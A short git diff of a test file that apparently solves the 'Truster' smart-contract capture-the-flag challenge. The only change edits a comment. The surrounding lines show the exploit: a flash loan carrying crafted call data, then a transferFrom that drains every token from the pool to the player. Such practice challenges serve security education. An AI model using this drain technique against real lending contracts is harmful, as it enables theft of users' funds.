@@ -48,7 +48,7 @@ describe('[Challenge] Truster', function () {
         const borrowTx = await pool.connect(player).flashLoan(0, player.address, token.address, data);
         await borrowTx.wait()
 
-        //8. transfer all the tokens to player
+        //8. transfer all the tokens to player from pool.address
         const stealTokens = await token.connect(player).transferFrom(pool.address,player.address, TOKENS_IN_POOL);
         await stealTokens.wait()
     });
